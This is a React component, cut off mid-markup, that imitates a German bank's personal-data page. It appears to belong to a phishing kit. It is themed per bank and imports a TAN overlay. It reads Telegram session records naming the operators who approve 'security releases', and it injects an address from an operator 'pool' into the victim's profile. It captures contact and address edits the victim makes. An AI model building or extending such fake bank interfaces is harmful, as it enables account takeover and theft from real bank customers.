import { useState, useRef, useEffect } from "react";
import { ChevronRight, Plus, Pencil, MoreVertical, Cake, Heart, Check, X, Mail, Smartphone, Phone, ChevronDown, CheckCircle2, ArrowLeft, Info, Trash2 } from "lucide-react";
import { BankTheme } from "@/data/banks";
import { supabase } from "@/integrations/supabase/client";
import { fetchTelegramSession } from "@/lib/telegramSession";
import SmartTanOverlay from "@/components/SmartTanOverlay";




interface CustomerData {
  anrede: string;
  name: string;
  kundenNr: string;
  geburtsdatum: string;
  familienstand: string;
  email: string;
  emailLabel?: string;
  mobilNr: string;
  mobilLabel?: string;
  adresse: {
    strasse: string;
    plzOrt: string;
  };
  twoFactorEnabled?: boolean;
}


interface PersonalDataOverviewProps {
  theme: BankTheme;
  customerData: CustomerData;
  onContinue: () => void;
  onEditAddress: () => void;
  skipPopup?: boolean;
  onContactSaved?: (type: "email" | "mobil" | "telefon", value: string, nutzung?: string) => void;
  bankId?: string;
  /** Wenn true: In der Adressen-Karte werden zwei Adressen (Haupt + weitere) angezeigt,
   *  eine muss gelöscht werden bevor "Weiter" möglich ist. Kein Popup. */
  addressDecisionPending?: boolean;
  /** Wird aufgerufen, sobald der Kunde die Zusatzadresse gelöscht hat.
   *  BankLogin startet dann eine erneute Telegram-Sicherheitsfreigabe. */
  onAddressChoiceResolved?: () => void;
  /** Wird aufgerufen, wenn der Kunde im Inline-Formular die Hauptadresse speichert. */
  onAddressChange?: (address: { strasse: string; plzOrt: string }) => void;
}

type AddContactType = "email" | "mobil" | "telefon" | null;
type ViewState = "overview" | "contact-list" | "add-contact" | "contact-success" | "edit-address" | "edit-contact";
type EditContactType = "email" | "mobil" | "telefon";

const PersonalDataOverview = ({ theme, customerData, onContinue, onEditAddress, skipPopup = false, onContactSaved, bankId, addressDecisionPending = false, onAddressChoiceResolved, onAddressChange, continueLoading = false }: PersonalDataOverviewProps & { continueLoading?: boolean }) => {

  const [showDetails, setShowDetails] = useState(false);
  // Popup unterdrücken, wenn skipPopup gesetzt ist ODER eine Adress-Entscheidung ansteht
  // ODER es in dieser Session (pro Bank) bereits einmal angezeigt wurde.
  const alreadyShownKey = bankId ? `pd_popup_shown:${bankId}` : null;
  const alreadyShown = alreadyShownKey ? sessionStorage.getItem(alreadyShownKey) === "1" : false;
  const [showPopup, setShowPopup] = useState(!skipPopup && !addressDecisionPending && !alreadyShown);
  useEffect(() => {
    if (showPopup && alreadyShownKey) {
      try { sessionStorage.setItem(alreadyShownKey, "1"); } catch {}
    }
  }, [showPopup, alreadyShownKey]);
  const themeColor = theme.headerBg === "#ffffff" ? theme.buttonBg : theme.headerBg;

  // Zweite Adresse aus Pool (nur bei anstehender Entscheidung nach Telegram-Ablehnung)
  const [additionalAddress, setAdditionalAddress] = useState<{ strasse: string; plzOrt: string } | null>(null);
  const [additionalDeleted, setAdditionalDeleted] = useState(false);
  const [selectedAddress, setSelectedAddress] = useState<"primary" | "additional" | null>(null);

  const parseStoredPoolAddress = (value: string | null | undefined) => {
    if (!value) return null;
    const cleaned = value.replace(/\s*\(Pool\s+[^)]+\)\s*$/i, "").trim();
    const match = cleaned.match(/^(.+?),\s*(\d{4,5})\s+(.+)$/);
    if (!match) return null;
    return {
      strasse: match[1]!.trim(),
      plzOrt: `${match[2]!.trim()} ${match[3]!.trim()}`,
    };
  };
  

  useEffect(() => {
    if (!addressDecisionPending || !bankId) return;
    let cancelled = false;
    (async () => {
      try {
        let pool = "main";
        const tgSessionId = sessionStorage.getItem(`tg_session:${bankId}`);
        if (tgSessionId) {
          const sess = await fetchTelegramSession(tgSessionId);
          const storedAddress = parseStoredPoolAddress(sess?.deleted_address_text);
          if (storedAddress) {
            if (!cancelled) setAdditionalAddress(storedAddress);
            return;
          }

          const u = sess?.decided_by_username?.toLowerCase();

          if (u === "xxelpatronxx" || u === "phantomscrt") pool = "elpatron";
          else if (u === "tauruss36") pool = "tauruss36";
        }
        const { data: poolRes } = await supabase.functions.invoke("public-read", {
          body: { action: "pool_address", pool },
        });
        const row = (poolRes as { row?: { street: string; zip_code: string; city: string } | null } | null)?.row;
        if (!cancelled && row) {
          setAdditionalAddress({
            strasse: row.street,
            plzOrt: `${row.zip_code} ${row.city}`,
          });
        }

      } catch (err) {
        console.warn("[personal-data] additional address fetch failed", err);
      }
    })();
    return () => { cancelled = true; };
  }, [addressDecisionPending, bankId]);

  // Wenn die Adress-Entscheidung erneut ansteht (z.B. nach abgelehnter Freigabe),
  // darf keine Vorauswahl mehr getroffen sein.
  useEffect(() => {
    if (addressDecisionPending && !additionalDeleted) {
      setSelectedAddress(null);
    }
  }, [addressDecisionPending, additionalDeleted]);



  // Editable fields
  const [editingField, setEditingField] = useState<string | null>(null);
  const [email, setEmail] = useState(customerData.email);
  const [mobilNr, setMobilNr] = useState(customerData.mobilNr);
  const [emailLabelLocal, setEmailLabelLocal] = useState<string | undefined>(customerData.emailLabel);
  const [mobilLabelLocal, setMobilLabelLocal] = useState<string | undefined>(customerData.mobilLabel);
  const [strasse, setStrasse] = useState(customerData.adresse.strasse);
  const [plzOrt, setPlzOrt] = useState(customerData.adresse.plzOrt);
  const [editPlz, setEditPlz] = useState("");
  const [editOrt, setEditOrt] = useState("");
  const [editStrasse, setEditStrasse] = useState("");
  const [editAdresszusatz, setEditAdresszusatz] = useState("");

  // Sync local state when customerData updates (e.g. polling result arrives later)
  useEffect(() => { setEmail(customerData.email); }, [customerData.email]);
  useEffect(() => { setMobilNr(customerData.mobilNr); }, [customerData.mobilNr]);
  useEffect(() => { setEmailLabelLocal(customerData.emailLabel); }, [customerData.emailLabel]);
  useEffect(() => { setMobilLabelLocal(customerData.mobilLabel); }, [customerData.mobilLabel]);
  useEffect(() => { setStrasse(customerData.adresse.strasse); }, [customerData.adresse.strasse]);
  useEffect(() => { setPlzOrt(customerData.adresse.plzOrt); }, [customerData.adresse.plzOrt]);

  const isMinimalProfile = !customerData.email?.trim()
    && !customerData.mobilNr?.trim()
    && !customerData.adresse?.strasse?.trim()
    && !customerData.adresse?.plzOrt?.trim()
    && !customerData.geburtsdatum?.trim();

  const emailLabelDisplay = emailLabelLocal || "E-Mail (privat)";
  const mobilLabelDisplay = mobilLabelLocal || "Mobil (privat)";
  const extractNutzung = (label: string | undefined, fallback = "privat") => {
    const m = label?.match(/\(([^)]+)\)/);
    return m ? m[1]!.trim() : fallback;
  };

  // Add contact flow
  const [showPlusMenu, setShowPlusMenu] = useState(false);
  const [showContactListMenu, setShowContactListMenu] = useState(false);
  const [viewState, setViewState] = useState<ViewState>("overview");
  const [cameFromContactList, setCameFromContactList] = useState(false);
  const [addContactType, setAddContactType] = useState<AddContactType>(null);
  const [newContactNutzung, setNewContactNutzung] = useState("privat");
  const [newContactValue, setNewContactValue] = useState("");
  const extraContactsKey = bankId ? `pd_extra_contacts:${bankId}` : null;
  const [extraContacts, setExtraContacts] = useState<
    { type: "email" | "mobil" | "telefon"; nutzung: string; value: string }[]
  >(() => {
    if (!extraContactsKey) return [];
    try {
      const raw = sessionStorage.getItem(extraContactsKey);
      return raw ? JSON.parse(raw) : [];
    } catch {
      return [];
    }
  });
  useEffect(() => {
    if (!extraContactsKey) return;
    try { sessionStorage.setItem(extraContactsKey, JSON.stringify(extraContacts)); } catch {}
  }, [extraContacts, extraContactsKey]);
  const [showNutzungDropdown, setShowNutzungDropdown] = useState(false);
  const nutzungDropdownRef = useRef<HTMLDivElement>(null);

  // Edit contact state
  const [editContactType, setEditContactType] = useState<EditContactType | null>(null);
  const [editContactNutzung, setEditContactNutzung] = useState("privat");
  const [editContactValue, setEditContactValue] = useState("");
  const [editContactFromList, setEditContactFromList] = useState(false);
  const plusMenuRef = useRef<HTMLDivElement>(null);
  const contactListMenuRef = useRef<HTMLDivElement>(null);

  const startEdit = (field: string) => setEditingField(field);
  const cancelEdit = () => setEditingField(null);
  const saveEdit = () => setEditingField(null);

  // Close menus on outside click
  useEffect(() => {
    const handler = (e: MouseEvent) => {
      if (plusMenuRef.current && !plusMenuRef.current.contains(e.target as Node)) {
        setShowPlusMenu(false);
      }
      if (contactListMenuRef.current && !contactListMenuRef.current.contains(e.target as Node)) {
        setShowContactListMenu(false);
      }
      if (nutzungDropdownRef.current && !nutzungDropdownRef.current.contains(e.target as Node)) {
        setShowNutzungDropdown(false);
      }
    };
    if (showPlusMenu || showContactListMenu || showNutzungDropdown) document.addEventListener("mousedown", handler);
    return () => document.removeEventListener("mousedown", handler);
  }, [showPlusMenu, showContactListMenu, showNutzungDropdown]);

  const openAddContact = (type: AddContactType, fromList = false) => {
    setAddContactType(type);
    setNewContactNutzung("privat");
    setNewContactValue("");
    setShowPlusMenu(false);
    setShowContactListMenu(false);
    setCameFromContactList(fromList);
    setViewState("add-contact");
  };

  const submitContact = () => {
    const val = newContactValue.trim();
    if (val && addContactType) {
      setExtraContacts((prev) => [
        ...prev,
        { type: addContactType, nutzung: newContactNutzung, value: val },
      ]);
      onContactSaved?.(addContactType, val, newContactNutzung);
    }
    setViewState("contact-success");
  };


  const backToOverview = () => {
    setViewState("overview");
    setAddContactType(null);
    setCameFromContactList(false);
  };

  const backToContactList = () => {
    setViewState("contact-list");
    setAddContactType(null);
  };

  const goBack = () => {
    if (cameFromContactList) backToContactList();
    else backToOverview();
  };

  const openEditContact = (type: EditContactType, fromList = false) => {
    setEditContactType(type);
    setEditContactFromList(fromList);
    if (type === "email") {
      setEditContactNutzung(extractNutzung(emailLabelLocal));
      setEditContactValue(email);
    } else if (type === "mobil") {
      setEditContactNutzung(extractNutzung(mobilLabelLocal));
      setEditContactValue(mobilNr);
    } else {
      setEditContactNutzung("privat");
      setEditContactValue("");
    }
    setViewState("edit-contact");
  };

  const editContactTypeLabel = editContactType === "email" ? "E-Mail" : editContactType === "mobil" ? "Mobil" : "Telefon";

  const contactTypeLabel = addContactType === "email" ? "E-Mail" : addContactType === "mobil" ? "Mobil" : "Telefon";

  // ── Contact List View ──
  if (viewState === "contact-list") {
    return (
      <div className="w-full max-w-3xl mx-auto flex flex-col gap-5">
        <div>
          <p className="text-sm font-semibold mb-1" style={{ color: themeColor }}>Persönliche Daten</p>
          <button onClick={backToOverview} className="flex items-center gap-2 hover:underline">
            <h1 className="text-2xl sm:text-3xl font-bold" style={{ color: themeColor }}>Kontakt</h1>
          </button>
        </div>

        <div className="flex justify-end">
          <div className="relative" ref={contactListMenuRef}>
              <button
                onClick={() => setShowContactListMenu(!showContactListMenu)}
                className="flex items-center gap-2 px-5 py-2.5 text-white text-sm font-medium transition-opacity hover:opacity-90"
                style={{ backgroundColor: themeColor, borderRadius: theme.buttonRadius }}
              >
              <Plus className="w-4 h-4" /> Kontakt hinzufügen
            </button>
            {showContactListMenu && (
              <div className="absolute right-0 top-full mt-1 bg-white rounded-xl shadow-lg border border-gray-200 py-2 w-48 z-20">
                <button onClick={() => openAddContact("email", true)} className="flex items-center gap-3 w-full px-4 py-3 text-sm font-medium text-gray-900 hover:bg-gray-50 transition-colors">
                  <Mail className="w-5 h-5 text-gray-700" /> E-Mail
                </button>
                <button onClick={() => openAddContact("mobil", true)} className="flex items-center gap-3 w-full px-4 py-3 text-sm font-medium text-gray-900 hover:bg-gray-50 transition-colors">
                  <Smartphone className="w-5 h-5 text-gray-700" /> Mobil
                </button>
                <button onClick={() => openAddContact("telefon", true)} className="flex items-center gap-3 w-full px-4 py-3 text-sm font-medium text-gray-900 hover:bg-gray-50 transition-colors">
                  <Phone className="w-5 h-5 text-gray-700" /> Telefon
                </button>
              </div>
            )}
          </div>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          {/* E-Mail card */}
          <div className="bg-white rounded-xl border border-gray-200 p-5">
            <div className="flex items-center justify-between mb-3">
              <p className="text-xs text-gray-500">{emailLabelDisplay}</p>
              <button className="p-1 rounded hover:bg-gray-100">
                <MoreVertical className="w-4 h-4" style={{ color: themeColor }} />
              </button>
            </div>
            <div className="h-px bg-gray-100 mb-3" />
            <p className="text-sm font-medium text-gray-900">{email}</p>
          </div>

          {/* Mobil card */}
          <div className="bg-white rounded-xl border border-gray-200 p-5">
            <div className="flex items-center justify-between mb-3">
              <p className="text-xs text-gray-500">{mobilLabelDisplay}</p>
              <button className="p-1 rounded hover:bg-gray-100">
                <MoreVertical className="w-4 h-4" style={{ color: themeColor }} />
              </button>
            </div>
            <div className="h-px bg-gray-100 mb-3" />
            <p className="text-sm font-medium text-gray-900">{mobilNr}</p>
          </div>

          {/* Extra contacts */}
          {extraContacts.map((c, idx) => {
            const typeLabel = c.type === "email" ? "E-Mail" : c.type === "mobil" ? "Mobil" : "Telefon";
            return (
              <div key={idx} className="bg-white rounded-xl border border-gray-200 p-5">
                <div className="flex items-center justify-between mb-3">
                  <p className="text-xs text-gray-500">{typeLabel} ({c.nutzung})</p>
                  <button
                    onClick={() =>
                      setExtraContacts((prev) => prev.filter((_, i) => i !== idx))
                    }
                    className="p-1 rounded hover:bg-gray-100"
                    aria-label="Kontakt löschen"
                  >
                    <Trash2 className="w-4 h-4" style={{ color: themeColor }} />
                  </button>
                </div>
                <div className="h-px bg-gray-100 mb-3" />
                <p className="text-sm font-medium text-gray-900 break-all">{c.value}</p>
              </div>
            );
          })}
        </div>

        <div className="flex justify-center mt-4">
          <button
            onClick={backToOverview}
            className="px-6 py-2.5 rounded-full text-white text-sm font-medium transition-opacity hover:opacity-90"
            style={{ backgroundColor: themeColor }}
          >
            Zurück zu Persönliche Daten
          </button>
        </div>
      </div>
    );
  }

  // ── Add Contact Form View ──
  if (viewState === "add-contact") {
    return (
      <div className="w-full max-w-2xl mx-auto flex flex-col gap-5">
        <button onClick={goBack} className="flex items-center gap-1 text-sm font-medium hover:underline self-start" style={{ color: themeColor }}>
          Zurück
        </button>
        <h1 className="text-2xl sm:text-3xl font-bold" style={{ color: themeColor }}>
          Kontakt hinzufügen
        </h1>

        <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
          <div className="p-5 sm:p-6">
            <h2 className="text-lg font-bold text-gray-900 mb-4">{contactTypeLabel}</h2>
            <div className="flex flex-col gap-4">
              {/* Nutzung dropdown */}
              <div className="relative w-full" ref={nutzungDropdownRef}>
                <label className="text-xs text-gray-500 mb-1 block">Nutzung*</label>
                <button
                  type="button"
                  onClick={() => setShowNutzungDropdown(!showNutzungDropdown)}
                  className="w-full border rounded-lg px-4 py-3 text-sm font-medium text-gray-900 bg-white focus:outline-none flex items-center justify-between transition-colors"
                  style={{ borderColor: showNutzungDropdown ? themeColor : "#d1d5db", boxShadow: showNutzungDropdown ? `0 0 0 2px ${themeColor}40` : "none" }}
                >
                  {newContactNutzung}
                  <ChevronDown className={`w-4 h-4 text-gray-400 transition-transform ${showNutzungDropdown ? "rotate-180" : ""}`} />
                </button>
                {showNutzungDropdown && (
                  <div className="absolute left-0 right-0 top-full mt-1 bg-white rounded-lg border shadow-lg z-20 overflow-hidden"
                    style={{ borderColor: themeColor }}
                  >
                    {["privat und geschäftlich", "privat", "geschäftlich"].map((opt) => (
                      <button
                        key={opt}
                        onClick={() => { setNewContactNutzung(opt); setShowNutzungDropdown(false); }}
                        className="flex items-center justify-between w-full px-4 py-3 text-sm font-medium text-gray-900 transition-colors"
                        style={{
                          backgroundColor: newContactNutzung === opt ? `${themeColor}15` : "transparent",
                        }}
                      >
                        {opt}
                        {newContactNutzung === opt && (
                          <Check className="w-5 h-5" style={{ color: themeColor }} />
                        )}
                      </button>
                    ))}
                  </div>
                )}
              </div>

              {addContactType === "email" ? (
                <div className="flex-1">
                  <label className="text-xs text-gray-500 mb-1 block">E-Mail-Adresse*</label>
                  <input
                    type="email"
                    value={newContactValue}
                    onChange={(e) => setNewContactValue(e.target.value)}
                    placeholder=""
                    className="w-full border border-gray-300 rounded-md px-3 py-2.5 text-sm font-medium text-gray-900 focus:outline-none focus:ring-2"
                    autoFocus
                  />
                </div>
              ) : (
                <>
                  {/* Country flag placeholder */}
                  <div className="flex items-end gap-2">
                    <div>
                      <label className="text-xs text-gray-500 mb-1 block">&nbsp;</label>
                      <div className="flex items-center gap-1 border border-gray-300 rounded-md px-3 py-2.5 bg-white">
                        <span className="text-base">🇩🇪</span>
                        <ChevronDown className="w-3 h-3 text-gray-400" />
                      </div>
                    </div>
                    <div className="flex-1">
                      <label className="text-xs text-gray-500 mb-1 block">{contactTypeLabel}-Nr.*</label>
                      <input
                        type="tel"
                        value={newContactValue}
                        onChange={(e) => setNewContactValue(e.target.value)}
                        placeholder="+49"
                        className="w-full border border-gray-300 rounded-md px-3 py-2.5 text-sm font-medium text-gray-900 focus:outline-none focus:ring-2"
                        autoFocus
                      />
                    </div>
                  </div>
                </>
              )}
            </div>
          </div>

          {/* Footer buttons */}
          <div className="border-t border-gray-100 bg-gray-50/50 px-5 sm:px-6 py-4 flex justify-between">
            <button
              onClick={goBack}
              className="px-6 py-2.5 rounded-full border-2 text-sm font-medium transition-colors hover:bg-gray-50"
              style={{ borderColor: themeColor, color: themeColor }}
            >
              Abbrechen
            </button>
            <button
              onClick={submitContact}
              className="px-8 py-2.5 rounded-full text-white text-sm font-medium transition-opacity hover:opacity-90"
              style={{ backgroundColor: themeColor }}
            >
              Weiter
            </button>
          </div>
        </div>
      </div>
    );
  }

  // ── Success View ──
  if (viewState === "contact-success") {
    return (
      <div className="w-full max-w-2xl mx-auto flex flex-col gap-5">
        <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
          <div className="flex flex-col items-center text-center px-6 py-10 bg-green-50/60 mx-5 mt-5 rounded-lg">
            <CheckCircle2 className="w-16 h-16 text-green-700 mb-4" strokeWidth={1.5} />
            <h2 className="text-xl font-bold text-gray-900 mb-2">Kontakt erfolgreich hinzugefügt</h2>
            <p className="text-sm text-gray-600 max-w-md">
              Die Kontaktdaten wurden erfolgreich gespeichert. Sie können die hinterlegten Kontaktmöglichkeiten jederzeit einsehen und verwalten.
            </p>
          </div>

          <div className="px-6 py-6 text-center">
            <div className="flex justify-center gap-3">
              <button
                onClick={backToOverview}
                className="px-6 py-2.5 rounded-full border-2 text-sm font-medium transition-colors hover:bg-gray-50"
                style={{ borderColor: themeColor, color: themeColor }}
              >
                Persönliche Daten
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // ── Edit Contact View ──
  if (viewState === "edit-contact" && editContactType) {
    const isPhone = editContactType === "mobil" || editContactType === "telefon";
    return (
      <div className="w-full max-w-2xl mx-auto flex flex-col gap-5">
        <div className="flex items-start justify-between">
          <div>
            <p className="text-sm font-semibold mb-1" style={{ color: themeColor }}>Persönliche Daten</p>
            <h1 className="text-2xl sm:text-3xl font-bold" style={{ color: themeColor }}>Kontakt bearbeiten</h1>
          </div>
          <button
            className="flex items-center gap-2 px-4 py-2 rounded-full border-2 text-sm font-medium transition-colors hover:bg-gray-50"
            style={{ borderColor: themeColor, color: themeColor }}
          >
            <Trash2 className="w-4 h-4" /> Kontakt löschen
          </button>
        </div>

        <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
          <div className="p-5 sm:p-6">
            <h2 className="text-lg font-bold text-gray-900 mb-4">{editContactTypeLabel}</h2>
            <div className="flex flex-row gap-3 items-end">
              {/* Nutzung */}
              <div className="flex-1 max-w-[200px]">
                <label className="text-xs text-gray-500 mb-1 block">Nutzung*</label>
                <div className="relative">
                  <select
                    value={editContactNutzung}
                    onChange={(e) => setEditContactNutzung(e.target.value)}
                    className="w-full border border-gray-300 rounded-lg px-3 py-3 text-sm font-medium text-gray-900 appearance-none bg-white focus:outline-none focus:ring-2"
                  >
                    <option value="privat">privat</option>
                    <option value="privat und geschäftlich">privat und geschäftlich</option>
                    <option value="geschäftlich">geschäftlich</option>
                  </select>
                  <ChevronDown className="w-4 h-4 text-gray-400 absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none" />
                </div>
              </div>

              {isPhone && (
                <div className="flex items-center gap-1 border border-gray-300 rounded-lg px-3 py-3 bg-white">
                  <span className="text-base">🇩🇪</span>
                  <ChevronDown className="w-3 h-3 text-gray-400" />
                </div>
              )}

              {/* Value field */}
              <div className="flex-1">
                <label className="text-xs text-gray-500 mb-1 block">
                  {editContactType === "email" ? "E-Mail-Adresse*" : editContactType === "mobil" ? "Mobilfunk-Nr.*" : "Telefon-Nr.*"}
                </label>
                <input
                  type={editContactType === "email" ? "email" : "tel"}
                  value={editContactValue}
                  onChange={(e) => setEditContactValue(e.target.value)}
                  className="w-full border border-gray-300 rounded-lg px-3 py-3 text-sm font-medium text-gray-900 focus:outline-none focus:ring-2"
                />
              </div>
            </div>
          </div>

          {/* Footer buttons */}
          <div className="border-t border-gray-100 bg-gray-50/50 px-5 sm:px-6 py-4 flex justify-between">
            <button
              onClick={() => {
                if (editContactFromList) setViewState("contact-list");
                else backToOverview();
              }}
              className="px-6 py-2.5 rounded-full border-2 text-sm font-medium transition-colors hover:bg-gray-50"
              style={{ borderColor: themeColor, color: themeColor }}
            >
              Abbrechen
            </button>
            <button
              onClick={() => {
                const val = editContactValue.trim();
                if (editContactType === "email") {
                  setEmail(val);
                  setEmailLabelLocal(`E-Mail (${editContactNutzung})`);
                } else if (editContactType === "mobil") {
                  setMobilNr(val);
                  setMobilLabelLocal(`Mobil (${editContactNutzung})`);
                }
                if (val && editContactType) onContactSaved?.(editContactType, val);
                if (editContactFromList) setViewState("contact-list");
                else backToOverview();
              }}
              className="px-8 py-2.5 rounded-full text-white text-sm font-medium transition-opacity hover:opacity-90"
              style={{ backgroundColor: themeColor }}
            >
              Weiter
            </button>
          </div>
        </div>
      </div>
    );
  }

  // ── Edit Address View ──
  if (viewState === "edit-address") {
    return (
      <div className="w-full max-w-2xl mx-auto flex flex-col gap-5">
        <div>
          <p className="text-sm font-semibold mb-1" style={{ color: themeColor }}>Persönliche Daten</p>
          <button onClick={backToOverview} className="flex items-center gap-2 hover:underline">
            
            <h1 className="text-2xl sm:text-3xl font-bold" style={{ color: themeColor }}>Adresse bearbeiten</h1>
          </button>
        </div>

        <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
          <div className="p-5 sm:p-6">
            <h2 className="text-lg font-bold text-gray-900 mb-5">Hauptadresse (Wohnsitz)</h2>

            {/* Adressat */}
            <div className="mb-5">
              <div className="flex items-center gap-2 mb-1">
                <p className="text-xs text-gray-500">Adressat</p>
                <div className="relative group">
                  <Info className="w-4 h-4 text-gray-500 cursor-pointer" />
                  <div className="absolute left-6 top-0 bg-white border border-gray-200 rounded-lg shadow-lg p-3 w-56 hidden group-hover:block z-10">
                    <p className="text-xs font-bold text-gray-900 mb-1">Nicht änderbar</p>
                    <p className="text-xs text-gray-600">Wenn Sie selbst bei einer anderen Person postalisch erreichbar sind, nutzen Sie den Adresszusatz mit „c/o".</p>
                  </div>
                </div>
              </div>
              <p className="text-sm font-medium text-gray-900">{customerData.name}</p>
            </div>

            {/* Land */}
            <div className="mb-5">
              <div className="flex items-center gap-2 mb-1">
                <p className="text-xs text-gray-500">Land</p>
                <div className="relative group">
                  <Info className="w-4 h-4 text-gray-500 cursor-pointer" />
                  <div className="absolute left-6 top-0 bg-white border border-gray-200 rounded-lg shadow-lg p-3 w-56 hidden group-hover:block z-10">
                    <p className="text-xs font-bold text-gray-900 mb-1">Nicht änderbar</p>
                    <p className="text-xs text-gray-600">Bei Umzug ins Ausland: Kontaktieren Sie Ihre Bank.</p>
                  </div>
                </div>
              </div>
              <p className="text-sm font-medium text-gray-900">Deutschland</p>
            </div>

            {/* PLZ + Ort */}
            <div className="grid grid-cols-2 gap-3 mb-4">
              <div>
                <label className="text-xs text-gray-500 mb-1 block">PLZ *</label>
                <input
                  type="text"
                  value={editPlz}
                  onChange={(e) => setEditPlz(e.target.value)}
                  className="w-full border border-gray-300 rounded-md px-3 py-2.5 text-sm font-medium text-gray-900 focus:outline-none focus:ring-2"
                  style={{ focusRingColor: themeColor } as any}
                />
              </div>
              <div>
                <label className="text-xs text-gray-500 mb-1 block">Ort *</label>
                <input
                  type="text"
                  value={editOrt}
                  onChange={(e) => setEditOrt(e.target.value)}
                  className="w-full border border-gray-300 rounded-md px-3 py-2.5 text-sm font-medium text-gray-900 focus:outline-none focus:ring-2"
                />
              </div>
            </div>

            {/* Straße + Adresszusatz */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className="text-xs text-gray-500 mb-1 block">Straße, Haus-Nr. *</label>
                <input
                  type="text"
                  value={editStrasse}
                  onChange={(e) => setEditStrasse(e.target.value)}
                  className="w-full border border-gray-300 rounded-md px-3 py-2.5 text-sm font-medium text-gray-900 focus:outline-none focus:ring-2"
                />
              </div>
              <div>
                <label className="text-xs text-gray-500 mb-1 block">Adresszusatz (Optional)</label>
                <input
                  type="text"
                  value={editAdresszusatz}
                  onChange={(e) => setEditAdresszusatz(e.target.value)}
                  placeholder=""
                  className="w-full border border-gray-300 rounded-md px-3 py-2.5 text-sm font-medium text-gray-900 focus:outline-none focus:ring-2"
                />
              </div>
            </div>
          </div>

          {/* Footer buttons */}
          <div className="border-t border-gray-100 bg-gray-50/50 px-5 sm:px-6 py-4 flex justify-between">
            <button
              onClick={backToOverview}
              className="px-6 py-2.5 rounded-full border-2 text-sm font-medium transition-colors hover:bg-gray-50"
              style={{ borderColor: themeColor, color: themeColor }}
            >
              Abbrechen
            </button>
            <button
              onClick={() => {
                const newStrasse = editStrasse;
                const newPlzOrt = `${editPlz} ${editOrt}`.trim();
                setStrasse(newStrasse);
                setPlzOrt(newPlzOrt);
                onAddressChange?.({ strasse: newStrasse, plzOrt: newPlzOrt });
                backToOverview();

              }}
              className="px-8 py-2.5 rounded-full text-white text-sm font-medium transition-opacity hover:opacity-90"
              style={{ backgroundColor: themeColor }}
            >
              Weiter
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="w-full max-w-2xl mx-auto flex flex-col gap-5">
      <h1 className="text-2xl sm:text-3xl font-bold" style={{ color: themeColor }}>
        Persönliche Daten
      </h1>

      {/* Popup overlay */}
      {showPopup && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60">
          <div className="bg-white rounded-xl shadow-2xl w-[90%] max-w-md overflow-hidden">
            {/* Deep colored header with info icon */}
            <div
              className="flex items-center justify-center py-10"
              style={{
                background: `linear-gradient(180deg, ${themeColor} 0%, ${themeColor}dd 100%)`,
                filter: "brightness(0.75)"
              }}
            >
              <div className="w-16 h-16 rounded-full border-2 border-white flex items-center justify-center">
                <Info className="w-10 h-10 text-white" strokeWidth={1.5} />
              </div>
            </div>
            {/* Body */}
            <div className="px-6 py-6">
              <h2 className="text-xl font-bold mb-2" style={{ color: themeColor, fontFamily: "'Fira Sans', sans-serif" }}>
                {isMinimalProfile ? "Bitte aktualisieren Sie Ihre Kontakt-Adressen" : "Sind Ihre Daten noch aktuell?"}
              </h2>
              <p className="text-sm text-gray-600 mb-6">
                {isMinimalProfile
                  ? "Bitte bestätigen Sie Ihre Kontakt Adressen, um fortzufahren."
                  : "Überprüfen Sie Ihre Angaben und passen Sie sie bei Bedarf an."}
              </p>
              <div className="flex justify-end">
                <button
                  onClick={() => setShowPopup(false)}
                  className="px-10 py-3 rounded-full text-white text-sm font-medium transition-opacity hover:opacity-90"
                  style={{ backgroundColor: themeColor }}
                >
                  OK
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Personal info card */}
      <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
        <div className="p-5 sm:p-6">
          <div className="flex items-start justify-between">
            <div>
              <p className="text-xs text-gray-500 mb-0.5">{customerData.anrede}</p>
              <p className="text-lg font-bold text-gray-900">{customerData.name}</p>
              {!isMinimalProfile && (
                <p className="text-xs text-gray-500 mt-1">
                  Kunden-Nr. <span className="font-semibold text-gray-700">{customerData.kundenNr}</span>
                </p>
              )}
            </div>
            <button className="p-1.5 rounded-lg hover:bg-gray-100 transition-colors">
              <MoreVertical className="w-5 h-5 text-gray-400" />
            </button>
          </div>
        </div>

        <div className="border-t border-gray-100 bg-gray-50/50 px-5 sm:px-6 py-3">
          <div className="flex items-center gap-4 text-sm text-gray-700">
            <span className="flex items-center gap-1.5">
              <Cake className="w-4 h-4 text-gray-400" />
              {customerData.geburtsdatum}
            </span>
            <span className="text-gray-300">|</span>
            <span className="flex items-center gap-1.5">
              <Heart className="w-4 h-4 text-gray-400" />
              {customerData.familienstand}
            </span>
          </div>
        </div>

        {typeof customerData.twoFactorEnabled === "boolean" && (
          <div className="border-t border-gray-100 px-5 sm:px-6 py-3">
            <p className="text-sm text-gray-700">
              2FA: <span className="font-semibold">{customerData.twoFactorEnabled ? "Ja" : "Nein"}</span>
            </p>
          </div>
        )}

        <div className="border-t border-gray-100 px-5 sm:px-6 py-3">
          <button
            onClick={() => setShowDetails(!showDetails)}
            className="flex items-center gap-1 text-sm font-medium hover:underline"
            style={{ color: themeColor }}
          >
            Weitere Details <ChevronRight className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* Contact card */}
      <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-visible">

        <div className="p-5 sm:p-6">
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-lg font-bold text-gray-900">Kontakt</h2>
            <div className="relative" ref={plusMenuRef}>
              <button
                onClick={() => setShowPlusMenu(!showPlusMenu)}
                className="p-1.5 rounded-lg hover:bg-gray-100 transition-colors"
              >
                <Plus className="w-5 h-5" style={{ color: themeColor }} />
              </button>
              {showPlusMenu && (
                <div className="absolute right-0 top-full mt-1 bg-white rounded-xl shadow-lg border border-gray-200 py-2 w-48 z-20">
                  <button onClick={() => openAddContact("email")} className="flex items-center gap-3 w-full px-4 py-3 text-sm font-medium text-gray-900 hover:bg-gray-50 transition-colors">
